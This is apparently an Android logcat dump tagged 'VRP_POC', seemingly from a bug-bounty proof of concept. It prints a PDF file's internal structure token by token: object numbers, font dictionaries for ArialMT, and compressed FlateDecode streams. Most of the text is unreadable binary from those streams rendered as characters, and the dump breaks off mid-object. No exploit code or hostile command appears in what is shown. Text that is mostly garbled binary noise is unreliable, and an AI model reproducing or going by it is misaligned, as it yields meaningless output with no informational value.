+07-10 06:34:18.744  8730  8730 D VRP_POC : stream
+07-10 06:34:18.744  8730  8730 D VRP_POC : x���=�0�w����{&f�D;����%�T%i'�������$��@ǥ0��o3%B�`=Ô�}��$��[ve=�F���"Ү�{�=2$�i���
+07-10 06:34:18.744  8730  8730 D VRP_POC : ��-�y��Ot?�9Gj̕�/�̶J��<����)V��!iݫ���X��ŭR�S^;������Us
+07-10 06:34:18.744  8730  8730 D VRP_POC : endstream
+07-10 06:34:18.744  8730  8730 D VRP_POC : endobj
+07-10 06:34:18.744  8730  8730 D VRP_POC : 21
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : obj
+07-10 06:34:18.744  8730  8730 D VRP_POC : 168
+07-10 06:34:18.744  8730  8730 D VRP_POC : endobj
+07-10 06:34:18.744  8730  8730 D VRP_POC : 22
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : obj
+07-10 06:34:18.744  8730  8730 D VRP_POC : [
+07-10 06:34:18.744  8730  8730 D VRP_POC : ]
+07-10 06:34:18.744  8730  8730 D VRP_POC : endobj
+07-10 06:34:18.744  8730  8730 D VRP_POC : 20
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : obj
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Font
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Pattern
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : /XObject
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : /ExtGState
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Alpha0
+07-10 06:34:18.744  8730  8730 D VRP_POC : 10
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Alpha1
+07-10 06:34:18.744  8730  8730 D VRP_POC : 11
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : /ProcSet
+07-10 06:34:18.744  8730  8730 D VRP_POC : [
+07-10 06:34:18.744  8730  8730 D VRP_POC : /PDF
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Text
+07-10 06:34:18.744  8730  8730 D VRP_POC : /ImageB
+07-10 06:34:18.744  8730  8730 D VRP_POC : /ImageC
+07-10 06:34:18.744  8730  8730 D VRP_POC : /ImageI
+07-10 06:34:18.744  8730  8730 D VRP_POC : ]
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : endobj
+07-10 06:34:18.744  8730  8730 D VRP_POC : 17
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : obj
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Type
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Font
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Subtype
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Type0
+07-10 06:34:18.744  8730  8730 D VRP_POC : /BaseFont
+07-10 06:34:18.744  8730  8730 D VRP_POC : /MUFUZY+ArialMT
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Encoding
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Identity-H
+07-10 06:34:18.744  8730  8730 D VRP_POC : /DescendantFonts
+07-10 06:34:18.744  8730  8730 D VRP_POC : [
+07-10 06:34:18.744  8730  8730 D VRP_POC : 23
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : ]
+07-10 06:34:18.744  8730  8730 D VRP_POC : /ToUnicode
+07-10 06:34:18.744  8730  8730 D VRP_POC : 24
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : endobj
+07-10 06:34:18.744  8730  8730 D VRP_POC : 24
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : obj
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Filter
+07-10 06:34:18.744  8730  8730 D VRP_POC : /FlateDecode
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Length
+07-10 06:34:18.744  8730  8730 D VRP_POC : 27
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : stream
+07-10 06:34:18.744  8730  8730 D VRP_POC : x�]QIn� �s
+07-10 06:34:18.744  8730  8730 D VRP_POC : ��";��XHQ�J^tP�����T�x�ۗ�I� ��o��=vFL޼�=<h�<�v��FmPUc�e�Ey��p�Ds�����-&�_���y�
+07-10 06:34:18.744  8730  8730 D VRP_POC : �6#�|����Źo��L�X����{`�m�NE^�u=����3���H�`vB�f�Ҹ8n������iq����rdF~	�rjs(eOhGR��5�c��/�9��?)Ɇ,ۗ�F������}�e��mh�P��ږ\��E����n����9�+?����
+07-10 06:34:18.744  8730  8730 D VRP_POC : endstream
+07-10 06:34:18.744  8730  8730 D VRP_POC : endobj
+07-10 06:34:18.744  8730  8730 D VRP_POC : 26
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : obj
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Filter
+07-10 06:34:18.744  8730  8730 D VRP_POC : /FlateDecode
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Length
+07-10 06:34:18.744  8730  8730 D VRP_POC : 28
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : stream
+07-10 06:34:18.744  8730  8730 D VRP_POC : x��}	|T�����-3If&��=!3a��� �E2@�Ⱦ� H��,* �ت����oTъZ[�Ehк�ڟhm�R�Uk)֢�"y���F��_������{�ݷs�=��7�%Qi�s����o|��{��)�w�˗�o���	p�y�_6O��p���(�f��ٍ�2��Q�&��7齳:����,_1��Wӈ:�D}�_<g�H5����Ͽ`��%�;�MD�@���.)y}�^�Q_�{(�3�\��r�����,�>�x������h�D,���^������n�I��l�B�.��i�4!��$|��.r��TN�c�W��,���P�ȱ>��t����u5���	��ngZ�zG_M��L����&�κѺ�z����/��By4�W����ޢ��q�E�[��jiB��E�A���<�K���.EtK��}2����"G\��@)?���3HU@3i>m�=��)���X��B+P�]��v��L?��
+07-10 06:34:18.744  8730  8730 D VRP_POC : �����	�R7���W�>�����J���Q�J������""~.>�߳^��ES��G��O��J|Wj��5�p
+07-10 06:34:18.744  8730  8730 D VRP_POC : `\n�Ѧg�"O���b��*�{��ȋ{��H0�w���ET�>�_���E?fvl9d0#�t7��~.��iX,?��?�r��[��ݮ?���3�>�.�h�C��b�8[���5�q�xE�ar�\$�h������N֗髍k���[�Z�i�U�?�
+07-10 06:34:18.744  8730  8730 D VRP_POC : ��yX���A��g�i?���;��0D��Eb��>�W��b�xT�D-Ļ�#��L���)�e��oD^$/���{�~|ȿ�/�l����jC�zm1Z�F��ǵ?�y�~��8W덍�&c���������/���e��n���-�[����@���<�B������]��^��J�-|�<Q&��312��B�T��H^%6��T�*��(�!���~Y���C����x|ϑs�Ry��U�/5����j�Z�6R���Ֆk�i뵸���{�]�s�+|-=Y��R=���g�����3�����d��������g�g�g�g��&�.�k�H���8=Am>␶J���eo=W�*_�<ϢFm����Mb��B���
+07-10 06:34:18.744  8730  8730 D VRP_POC : s�,��'z)��9�Q~.kcE��Le/�43C�2D��O�o����O\)��>�.HD��j=����V{Gx���wz����#�H����Fi��O���
+07-10 06:34:18.744  8730  8730 D VRP_POC : z\V%�^9'6C/L⟚E�)���V�"�:�u��~(���F�-.��a���ƅf��)^��u���IR�(��fd�Ub���<"ߤ�i��Lok�����O���'�$1+�
+07-10 06:34:18.744  8730  8730 D VRP_POC : ���Z��2�N��8�41�J�C�n�kz�Jh��i����@��"$�s&�b*4�|�!A��ς{�v�Sd3�g���R�$�n=LwY�х֭��`�u9J�D��M�I\��}ZB�X9o�3��ߨ���u�M9Y�?y~1�%"����O�j<I��7h2UZ�[!�]�a�si��^�5���Q�qr�U�-Aߡ��#VH$�|�|OO�C�f{����5��}�+'Y˵�-07ab�������:eX�r�C8��>�+z�,�ѽ[��k�Υ%őNE�Paǂ��ܜ�̌�i�Ԁߗ�������IAݪ#5�xiC\/��՝�����&�!FP��i���,|r�R�KH�S�ZS�`x��-\	�_������u�o��ԇ�?V�7+�����9��q����\2]uC�ۖ�<"2bnr�n�-9l
+07-10 06:34:18.744  8730  8730 D VRP_POC : �xvd�6�=T(FfW�&��G��y���xn��[�J�g7�'L����/*���-.F̉����xjT%����9"�QՄpo��n��]��s���H��uqmv=בE�U��ｗs��Gԭi�����Yf�uk���&ֵ�-b��e �,�iXW���� �N�6yu}]\\�*���ݿ��jiX�'E�G�[؀��[�I�m�ˋ��Q^uxݔ�HQ�2?R?��`[��tَ�X8���ݶ���Hu��-3�5Nq*9s��ZGVp�"�!��0ZRA��3w����3�����oČ,�'�hX��?n�#�u�$ r�/'��vB̒�g�,�I��!����h���E�3s�6U��ݻ]�,#�%�0��&`lg�*���_��s�7M���a:7;�ʣ�q��1�ܘ̩��ƴfo�@�w���qoi��`V�����"�[����#��ׅ��58c[;�$�?�5���F�i���d��b!�3Z����K��TB����B*U��ă�l�>���_��l}¹9��if|P�d����'5ϷNC��U�N��n]�Iq5�����Ӕ����8M��,��fk���F}~<�!�	 v��=)a������ٽ[ݺu5�pͺ�u����s#�`d�n���uK�\�i��\����c5_¢�4|[D���-&�N�^�;����)uۥ�#��o+F\��0QL�J�@���C���.�*}��Q���U���i�¼n��9���aa�Sa�a3bJ][�QK��;�Q
+07-10 06:34:18.744  8730  8730 D VRP_POC : e`�݃�QZQZ	�M����齃A�(��CJ�Ȩǩ�C�q7	�;}��S�������.���e3���k��z�N�/c)))�3�Eڣ�_���Ɯ�̮'�]Rq)��8Y��ܤ�*_�ŋ@jPN��֧;�;�~����z�Ϝ��c�Pny�g�<�����Z����s��'��Q�����x�﾿��H�}�_h�p]��^�����*�`r�S}>9��_���qX&�iaݗ�\I���-45�Y.�%���Q�"��"%���\�6i��wt�f]��B�R&��y��i7�����T�~�\�i�H�m������4������y��Ç)�rH��������G4zE�5=ri���&��3�g�YcشWOQO�\/����S5�g�gd�s��>�⢥3����"�i���ΦG��%�~������)�vWM���ƞ/k�S-Ur�X������[��T�WPˎ��e)~��r�I���>���8z�45���D鯱.���9�H�iI$�7)%@�$��b!)A�.�n�J	b����cx�v��*櫝���эW�C����ؗ��=0�� ��ܨX�NI1���Ք�+�P���0�R�&K����d�z\������+5�/���'U9�O#H!�W�d�8��Uȓr�SPN��IUD�"r�%�}9Z~M�R9d�ݙ�voԇ��[I2՛!��%�k|��P�F�F�j]��@�v�~�E`�ߛ"�@��xY�Uybޱ���;�]�z�z�&���.S����0����=/X�oR�$��{�IX�~ �yjHoJ��{�&�^ۍ��Y�e������{r8�[�"R�����T�$U����T*��p��%Al�ӞF���rӎ���9�\���3���F��+��6��fb�`��m�yXO���\�H��tb���|�1H��P���uR�!��v����@2�b[e�k����7��?0P�_��wGh�����c��ҙbf}=�74sVv���(-�&""�N����i�ɖi[[�=�>�eԄ������_:�W?t{��1ևz�>'��rS�[�?�,ןW��_V�I��?�lt�L�̲��e=����!��G��]����u�e����]v�>����]~���.ު,QȊ5��.=��b��l��g.�ʉv+�3P�m�>��4o}t�wA����/�_D���	=X^�'��(#gV��]eׂ�@e��ƀ06���@������j�	E��������
+07-10 06:34:18.744  8730  8730 D VRP_POC : ��%�a�
+07-10 06:34:18.744  8730  8730 D VRP_POC : ��f�9�����ܑQP�֦Su��-�����e�g�b.�L�%J����������ph������[1G���y+�­+V�*�7Nf�ٱ@��Kå=K��a�����f�u�9���.�ő1a�Oρ������܁E\t��\�Kr:�{9u�����Gy�^s�)Cf�)���fp�ޜ<����`�pL��T�����An��k@���~��ì[�g.�r���G��!��}�}���<|<����6y��ϻ�`����v�--1�H�Ҿ}��믾}�t.�t2=����YY8gfdeGJ5��`{Wp"mH��[��lT�E�=O��^���\�v�`Rv��
+07-10 06:34:18.744  8730  8730 D VRP_POC : ��}f������5[��j\F��W\�|a�3��,��66{L�������]
+07-10 06:34:18.744  8730  8730 D VRP_POC : �]Ɩ�j8{���j��>���^�F�����R�������Fߌ�g�)ɓ2&�'��Is2
+07-10 06:34:18.744  8730  8730 D VRP_POC : ��^3v�}����8��q����PV(��5$�6oI�搧�,���$��ke��&ct�Y������7?��RE�H	�R~A�'��3!�9���(�y�'2�7+�O�P�[���&HeA���)u��Ԓ`�@����Қ��P�g<cHKg�NSK�%#�d1L�Qq\B
+07-10 06:34:18.744  8730  8730 D VRP_POC : �EZ��.�݈����Xז�<]Ib���t%��Ş�2Ղ�v�;ˣ�<����Sȭ�(�r}%���=yj��-�3!':.x��ht,���h[Ʉ2�y�w�����485�ڵ�/�,��*;�w�P�Է˚6`�3+^�����w?v�%m��������c?�(�u����52����o_~�-��p�C:416�j�Ғ��+W�|KS֮ڪ4�"���h��BB��#�)W�։�;�9��};��h��6��˦�J��dfÌ�w}<�O-d,��h:,�d���਒��2{�����>�Oa:@�p.�v��/cY&H)<J�P��>�,H�b[͖�ӱG��%+n�>��F��\z��!��`�(_�7�f�N�y���^,Ŏ�����y8����2i.�����w�<���f
+07-10 06:34:18.744  8730  8730 D VRP_POC : \&�e�\���b��2�Iu�\)3A�Iw�4���.̠ˤ�L���y�:v����������=���?d�6��e�7I��'iZ����,�Dx��1�|�D�\r_�,����ܜ&�t��s��V;�Z�<�i��g�d�I��}j��=q_&.t13V������s���ܜ/�U���
+07-10 06:34:18.744  8730  8730 D VRP_POC : ��^O�
+07-10 06:34:18.744  8730  8730 D VRP_POC : �u� ?�+@h58W��n��\C��#����&�M"%������>�!���8�r)�T*s��J6�NFYJ6�\G<��2�*�ERmq�[\�,V�(b�;�V>��e��^�M����h����V�i�E�����86��XZ6�nY猸,�et(���tf��(L�Ub���D�>��~J?��	��O)�'�n��/�䇡+_�w�Ȍ�Kn�Y�x�Az��f�[�g���Ο5���Pn_�b[����T��lVROm[�C�=���Unw���2�.S�2�.q�N.S�2a��b�SF�AIc����u������*~�Ön���I�y9�=k���m��'�"9g�wFҌ�)3|3���&/LY�[��Y��sj�����]�OO�Oi,m�<�������{|�v�a�;z>����ǝ첣��Ҭ.�:��2�)v�������v�dE�v,�p�to�_��.��Szt�c۲Sn7���V�ϝ��5w����]��N�ʽ)W��Ҙ	Cb3	(�N�#QP�DPH��8#��X0��G�3:��Qv,���M)���OJ���u`a�z���D^qn�CN�
+07-10 06:34:18.744  8730  8730 D VRP_POC : �ޗWan������U�朹aΕ�,��,�?�b��ȳ�c}�Kݾ����(e\'�/���_Ɩ8Q��*�R��ZPԹ�OCž
+07-10 06:34:18.744  8730  8730 D VRP_POC : YY�T!+�B�bʱ�Zua{��#%-!n[XIa�85�]NUmOs�TރJ�	��H��,�Tu=����$����_�
+07-10 06:34:18.744  8730  8730 D VRP_POC : 3��u+/�h��q���.e��r>�u�	+/UF+�J��+b���Պe�ܽ0bdt+M�;5��?�OI]<����0ޢ@$�:E�>o��|ѥsR���)�Ȋ ʇL�Q��,�j�*j���L>�p���lc�si��r�&��=�~�Ȇ��]�X�ҕ�S����+�����]�(�e�?���-[p�¬������pڂ����8�`�Es�Έ�T�^5n�e]B�Q�?/gҌI�#;$�v����zL=6�k����{���:�3o�W=M{���˘�4a�/�?�|�z�C�*�gh�8�/�~�� 9����Pq���/�L`��#]jL�:���c=]��:RL�.B�����y�~*�0��9ac���d�#�n΋2�p9�.���-6�Y�Q�z�y�������H�� ��Չ�s�Yon�;~�� �^�:��?�z:|���e
+07-10 06:34:18.744  8730  8730 D VRP_POC : ��r�s��Y�9�ӗY@_�Q���1��E��Á5�yZ+��@<(�F�k8�r�(�s5�+�������4(���h�̠�@�����~��|�sk��~�M_���ڶ@�?"r��>hR��%buFk��	t�L�����$0^w�ƀ��8���7�8��9��I��UXf�����4��q�3ף��^��T.�B��Z	��B���{Q�Ji
+07-10 06:34:18.744  8730  8730 D VRP_POC : ���[_��5����;N<6�¼NB]_�@���H�Kp>�����i-��=���@x���2�y8?�*q����@�0��@u ���Bə�=�rr���������Z��&ԫ)y�̰l*��l�c�6%�v�U�i�������"�1Z䠈����2��ls��5�2�R%ߋ������2�J���i$�A�AȖKyݡͼ�c�Y�r��e���R�55&XҦ�=�Ո"���v�;�t>=�2�s�S�Q�r��B��P�֕z=�� m\~L����7�r<�w%�;��b���܂�<H?.��N�Aa[��/[䕊�M��g�1e�����������-֟�������k���	�]���@P捊;��D�f�ItX��h����>�O&�<�§���t�~�zS4Q�<H�x2i�\����봚��.i#G'�\�,�ԕ�D�:ߑ��������||9��L�����Y����5��Z_�����u�|&����%�e"U{���Nюk���~d�:���7}"m���9f=�
+07-10 06:34:18.744  8730  8730 D VRP_POC : Mw�u'c��w��=��>˲��s��IK�6���#����=��jq�Ӯ�^j�S�����G�=��ͧt��G���%�[i�q���{��1�h�"�c���G?r�5X�f𘨹 ��}��D��3�E7�j�w�8ooJS�E%�����°�2�0�,z���*��е���������^L~o&��A�?�4���t��1��#J.8�"�T��@f�!�w���tg<Tc���a�@�f&MR��ǴјJga��i��al��&���M� _�گ���B7���!%�ӭc��g�:�5a��P�ф1\��^��:v�m3����w@�=q�ӣTm.�v�=�z�C�UX�=�v�E����	u_�p�[ɶ��^<1�`6);�T�NA��Gt�6��B��y��8\M�!�l4�l(�����6EZ���pٛ~�R�,�Cw�h�>�*�^X�i�]���t��J���n���g�ށ�hq�'lK�O8\��;i�>��҅�,Z�m��F��<�5�7BN���S��@���kӰ������Su��b裨�����.�,kѫ1�S����ڋ����m�)ڧ���"���!�����L�7��>�[�����&kƵ&������r��ޗ���V���_�V�ۭ/��e�t�r8�c��{�;��ܸ��zN�F���$���k��q���HL�q����gX{��1s%ex.��3��/�o�c==N�Y�8]����l3���}t�4�_�[mh���7��m�w��]	�T��Wʴe��u�-�i�u
+07-10 06:34:18.744  8730  8730 D VRP_POC : jC�����Ow�~�
+07-10 06:34:18.744  8730  8730 D VRP_POC : O�?�
+07-10 06:34:18.744  8730  8730 D VRP_POC : �'�'���t~��f��+��p+e�H$��/�P��,���_�4�Ne�nd�����x�̐�hk���Z���#��N���i$��.C��yh��KՌ6�ڏ�U�`ǻ���K���}1�UZ
+07-10 06:34:18.744  8730  8730 D VRP_POC : :t2���]���61��%�J��6z~S��?k�E�y���u	��A�|vH%�ȃ�O��g`ǡK�*���°{�t���v菈�}�"��aI=��s��\��r�z��&������ˣ�V;����B����=��A�D�?#�U����ς��)�?��|��͠��݀@:�g�=�s������R�,s���y�^�x����;����gw�OG��$P{pfzv_������8.�|���>�:���v4۲l?+�ѡ����X�K��R���~eۙ�W��՝���3����]ξ�V���t/��i����W�{R!ߟ�l� ���0͆�{W*���л���G���=�խ_ӱ�������G�{j��Y	��p�f$����ۻ�������������.��R���0�ү��������D��;��ן���'ʞk��Q^+��w�-��O��n�q�zs��궀���@_���:أ�[v��+����*����r���@7��~���n��A����A���9Qn�>W�!�L�����Tҁm��\�u�)���9W�n}��
+07-10 06:34:18.744  8730  8730 D VRP_POC : $؀��}i)��S�O�.�0Ӡ�c��ǃ&�&C�O<q�g7��ҌQw��i����A����Qwz-����(�����{:�3�n����ٹ�k0?�>x��$�;P�4�Lh�������Z
+07-10 06:34:18.744  8730  8730 D VRP_POC : U9w��]2�O�~e�����h{��G�Ϡ*�R��SM���}��f߻k��)��V<y3ݛ�<��m��J��i�v�F�=��3���Lu�U�Oq��w�y�w�N�mվt&�Ǵ�����^������1Oc�`�_4��+��O}�i���{�w��KZ���{�4Q��>�N�a������Ķ�ua\��-��&��Rw}�������9\���|��93�Xé<��n�~>7\_���r�#�}������0p�|����k2�ߦ��]���i��U����f�d�횇|��ّ�������NAݫY�k7�E�%��1�y��_OSԝ�g�9zuo�E�`����/V}w����\�}仹D��j��;R'��	��� �)Tc�bm1�}�u��1��TZ��K�������Q#C�X���Aa�3��&�-���7����}?M�^����8�rsr�(r��;|G�G�@ڥ����n������Q�pj�ͨ�>��hA�� Ϲ�8�����;#��L��p�%�p���p�����h�7���v|Sxi"^�h�7�I�#�Ҿ�D ��;��ƹ8/��v�K��%��	�ؖ�p6}�7�~�虠���g��|a�s��q����׺�Y����:��3�п��8W[O����=��6��f��y[���Vp�l�a�?��_&���?����Y��������u��mo��D����*_�,���!��'���iП|/���.����>?�e�����:��{u�g�M��әJ��?i�Z���i��wt��0��C~D��n`n�U�3�7�i�y�"����k�O���J��x$�-�P�eP6�m�9�ki,��U�gB��d�Iީ� �d���w�^���u$�����f����
+07-10 06:34:18.744  8730  8730 D VRP_POC : ���=����m=H�_��Y4���r϶��d�`8�{'��tC�f
+07-10 06:34:18.744  8730  8730 D VRP_POC : ����5����Y���g��@������?�(p�j3�;L��:�}o���1iT���9=J:��d��=��x�`{��ڤ����0a�F�s�y�����O�󨗱�Jݳ���y
+07-10 06:34:18.744  8730  8730 D VRP_POC : %���ǹ������+{1]=�r�Z�[?ok���]�D�Ƶ�Zm
+07-10 06:34:18.744  8730  8730 D VRP_POC : 玠����(�wh{þS��4���O݉$R�M�9�>Ȓc�z����0�3����X�K��y��=#)��3�G�u�m|[t2�bnF8��R���Hg�/G��c�z����jm"��'|!p9����8k��?b���.���:���lsW�u	��S�w���=�����_�C�5��T��"�t�뇝����L׎N���~ʕ6U�!Ӈ�c�5��i��+��>˷ر�:s��ｸ������s��=�Բ�_��s���\z���;������-UsB�cǲ�>F=��ws���p���2p2�1�}�S��N��2;�aބ|�7����y��n;x��	����DXW8��uU�P/��n��e�0��
+07-10 06:34:18.744  8730  8730 D VRP_POC : ��+j�^������qp��b��;.�۟����mv�w������t^�S�������K��=����(�݆z�f3up`b\����/:�������*is!Os����y�&7�l�p���7�	�Γc�~��՟j|<sm��t��I��c�^�~��y��+N�@�;�ɆX�`��u�S�9�;��&��i��ҧ˩F�d���t�'�/������u���g�~�V�=HS���m�m��-r�m�c/���~�]�����~�\�~iL��'�p�_@��ǈ���ϛ��4���l+~�f��,�=�jÏq��mj����~�P���<=�=��?����.�~i���(���A�z�e�Nli8Q�!�v��+�N�Q�	\��N��*���y����L�/��M�{�K��
+07-10 06:34:18.744  8730  8730 D VRP_POC : ?9��M��ePg{a_8��ǫ��.j�M܈��tU&5�_����(�$NJ,
+07-10 06:34:18.744  8730  8730 D VRP_POC : -��M�_�|{��;�+pz�I:��8L5������\k�1�Y{�G4D�Ni�S?�s��s~`;j?�Ѳ��E��^���ܡ�Oh�qu7��>xrp�����F%u1'`{�X�|�����w�Z��w�.�:�Lz�Fb���p���?\E��������z�b[d��i{�);�SE���k�Q�{����c�A��t�=�.�C�Ѷ��ՂѲx=L�nh�{e�ﴱl9� �Z��_�����*�~_K�=�>�Z|_};�w���y�������Lx�MϋN�n�������;>SI|w�t�r�֟���t�� �l#�`_�kn���p���,Kݏ��ڵZ
+07-10 06:34:18.744  8730  8730 D VRP_POC : ��r�AGS�s'�����_����N��<����4ܾ���r~��S�n��R-G�"��]�?ƹ�U��h���CSYײNU{�ۍs�M#����_�:HT �E�^r8�8\Q��2G��$�}�͆�j��tR��Y��f�g�m}�Q˳��|��A�m�qq�3?���:S������K[O*]������Q��S*�A����%Ƕܒ@�t���B'�'���;�n��tP{��ԕ��m=w�V�F�I�WF!�m�v�{߮�	sd?���~��s���{�����Y6�>����d�g�:����e�Q��|>Ʌ�^�z�s�r�Y�h�~/=��[�'������ڜod�wH^��Ի̠{�F����C�����
+07-10 06:34:18.744  8730  8730 D VRP_POC : �n�S�;���z�����6��x=GI�3)��c�+Z]����]C�v��f�+�����F}���\��`|��ER�H�����!�(�TȨiG;�юv���hG;�юv���hG;�юv���hG;�юv���hG;�юv���hG;�юv���hG;������E+���Џ�C��T����X��Ar7MѺ�(�	xJ�J����u��ڭu�:n�5k���úka�V��0���V`/��,��A�+�&`+�8���Dp96,6�8F�l���:k�ț�6�j�t����Bpˁ��,�&`#`�t�X	�>Q11-{��������)�c���;��Θ��;Ϊ��؉6�m'd'����1ܦ���4����i��b߰,-��B×��J�Bt��Iq@j���w�Vlܫ�$4�	j���O��iÒ�%�P:��_�a;F�H��8l�|��{M����h�<�c����G��S��|ߖoS��=���,`#�8x����[,-�e���-�A�;t�wpS�o��V�M����V�VL��aB%���0�Y���ۿ�
+07-10 06:34:18.744  8730  8730 D VRP_POC : �*�LC���:�P�u�^�+Ԭ�l� �,��#�7��|��DK^CͯQ���4��K�����^�&�f�> @����|xx�z1`�����f�{��а,��|��1��_*��|Nї䳊���Z��|n{a��� ��'-G�!��8=dK�{1v!��@%0���r�촽1��B�������#E��[��������)t88�Ke�t�]�Sz���)��zp�~o8vJϿ;����S:}8vJ�O�Y��Dq�P��DxX���t)F�R�ҥ��K�K_�ܶ����a�6Ģ]�BM{D�S�i�hz@4�MW��U�i�h:G4EES�h*M1�����h��'y�rDӋ��'�i�h*M%��X4�E�X�,�>��"Պ�Ƌ��>��#Z�/�N�w?`)_��Ĺ�L;�(���=U,6J>��Oc��w���4��i�4
+07-10 06:34:18.744  8730  8730 D VRP_POC : H�[	��G��0��~�rS���,`%p0Us����;MܪV�4z<����v·H�:���(���Z(�Z��?eeQz�7�Y�w�����)iX��Q�D17;���_t5�;��>�)~H�:�N�RQ:��)_*�2�Crh���iȖ���[h�p�]�/
+07-10 06:34:18.744  8730  8730 D VRP_POC : �}T�,�~X�d�p�.��"dˮ�k׆^(o�"��f�'���.�ɋ*�*Dl���ɮ�#C�
+07-10 06:34:18.744  8730  8730 D VRP_POC : T�\;�e��RC�J��F����sC�e(sW�����;U_γ+�M��l۵@U)TN��,�Ǻy�{�<�=�<�n�"O��ѓ���{�ހ��M�z��W�J/y3��C�(���S��G�I� ]�Aɮ��)���W��w�je���6�o՞�>9�,�'N���"�^K�S��Dk�=֤x�hm�3��mB�X�и\�,hJ]��8���x����$D��7�3�r�����uIeNe�д�5U�p�����9��__;�.��c}���c}m����u�ŧ����oL��vkCŧՓ8\ZU__�,��tC:H��T:/6fNGao��n�������	�%%Q�JW������m[V\]���X���2�fYv�m�K���D��j�U���8M|�JRP�$�*�ȣ��@�$�N$)w�\ۚ�ZU�&N�)����i��������>s�G�b���93��F�"�s���u��ω7�o�S��V�p��Lgύ�G�V��D����8E����F3���m��[�}plpudvU�����?��k[��3��M���p]#��"�?G���s]�������.R2>�n���׏�a�2%�ڐ_T?<+�d���E9W���R��q_dx�pT�a݇q�G��D�\9�(���D�N��/��r�T���რ���nt�7}W�ͮZ���6^6�6^9qz�6��ܥ� 7,%����g�@� Դք6�Ò���_���:�WA�|r���崬^��N�PS���3���-��òztp���enN��Q����������s"�2wHZ?<X��[�����
+07-10 06:34:18.744  8730  8730 D VRP_POC : endstream
+07-10 06:34:18.744  8730  8730 D VRP_POC : endobj
+07-10 06:34:18.744  8730  8730 D VRP_POC : 23
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : obj
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Type
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Font
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Subtype
+07-10 06:34:18.744  8730  8730 D VRP_POC : /CIDFontType2
+07-10 06:34:18.744  8730  8730 D VRP_POC : /BaseFont
+07-10 06:34:18.744  8730  8730 D VRP_POC : /MUFUZY+ArialMT
+07-10 06:34:18.744  8730  8730 D VRP_POC : /CIDSystemInfo
+07-10 06:34:18.744  8730  8730 D VRP_POC : <<
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Registry
+07-10 06:34:18.744  8730  8730 D VRP_POC : (Adobe)
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Ordering
+07-10 06:34:18.744  8730  8730 D VRP_POC : (UCS)
+07-10 06:34:18.744  8730  8730 D VRP_POC : /Supplement
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : >>
+07-10 06:34:18.744  8730  8730 D VRP_POC : /FontDescriptor
+07-10 06:34:18.744  8730  8730 D VRP_POC : 25
+07-10 06:34:18.744  8730  8730 D VRP_POC : 0
+07-10 06:34:18.744  8730  8730 D VRP_POC : R
+07-10 06:34:18.744  8730  8730 D VRP_POC : /CIDToGIDMap
